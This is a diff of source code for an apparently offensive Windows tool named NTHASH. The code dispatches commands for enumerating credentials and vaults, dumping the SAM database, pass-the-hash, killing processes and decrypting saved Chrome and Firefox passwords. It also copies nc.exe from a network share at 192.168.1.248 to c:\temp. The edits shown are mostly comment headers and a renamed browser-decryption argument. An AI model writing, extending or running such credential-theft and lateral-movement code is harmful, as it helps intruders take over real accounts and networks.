@@ -1278,8 +1278,9 @@ begin
   log('NTHASH /enumcred',1);
   log('NTHASH /enumcred2',1);
   log('NTHASH /enumvault',1);
-  log('NTHASH /chrome [/user:path_to_folder_containing_login_data]',1);
-  log('NTHASH /firefox [/user:path_to_database]',1);
+  //***************************************************
+  log('NTHASH /chrome [/binary:path_to_database]',1);
+  log('NTHASH /firefox [/binary:path_to_database]',1);
   //****************************************************
   log('NTHASH /bytetostring /input:hexabytes',1);
   log('NTHASH /stringtobyte /input:string',1);
@@ -1440,7 +1441,7 @@ begin
        delete(input,pos('/',input),2048);
        input:=trim(input);
        end;
-  //************************************************************
+  //************* ENCODE/DECOE ***********************************************
   p:=pos('/bytetostring',cmdline);
   if p>0 then
      begin
@@ -1582,7 +1583,7 @@ begin
              uwmi._CopyFile(server,'\\192.168.1.248\public\nc.exe','c:\temp\nc.exe') ;
              goto fin;
              end;
-//*****************************
+//*********PROCESS ********************
   p:=pos('/enumproc',cmdline);
     if p>0 then
        begin
@@ -1610,6 +1611,7 @@ begin
      if upsapi._killproc(strtoint(pid)) then log('OK',1) else log('NOT OK',1);
      goto fin;
      end;
+  //********************************************
   p:=pos('/dumpsam',cmdline);
   if p>0 then
      begin
@@ -1790,16 +1792,18 @@ begin
    begin
    pth(user,password,domain);
    end;
+  //********* BROWSER ****************************************
   p:=pos('/chrome',cmdline);
   if p>0 then
    begin
-   decrypt_chrome(user);
+   decrypt_chrome(binary);
    end;
   p:=pos('/firefox',cmdline);
   if p>0 then
    begin
-   decrypt_firefox(user);
+   decrypt_firefox(binary);
    end;
+  //***********************************************************
   fin:
   p:=pos('/wait',cmdline);
   if p>0 then readln;
